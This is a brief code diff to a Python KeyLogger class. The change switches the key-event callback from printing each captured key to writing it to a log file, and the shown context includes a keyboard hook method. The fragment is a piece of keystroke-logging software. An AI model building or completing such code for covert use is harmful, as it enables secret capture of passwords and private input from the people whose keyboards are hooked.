@@ -82,8 +82,7 @@ class KeyLogger(object):
 
         Default functionality logs keys to file.
         """
-        #self.logger.info(str(key))
-        print str(key)
+        self.logger.info(str(key))
 
     def hook(self):
         """ Hook Keyboard
